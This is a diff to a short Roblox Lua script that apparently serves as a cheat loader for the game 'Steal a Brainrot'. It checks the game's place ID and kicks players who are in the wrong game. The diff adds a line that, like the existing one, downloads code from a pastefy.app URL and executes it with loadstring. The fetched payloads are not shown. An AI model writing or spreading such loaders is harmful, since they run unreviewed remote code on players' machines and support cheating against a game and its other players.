@@ -1,2 +1,3 @@
 if not table.find({109983668079237, 96342491571673}, game.PlaceId) then game.Players.LocalPlayer:Kick("wrong game,please join the correct steal.a brainrot") return end
+loadstring(game:HttpGet("https://pastefy.app/nfQHINmW/raw"))()
 loadstring(game:HttpGet("https://pastefy.app/filGCQWJ/raw"))()
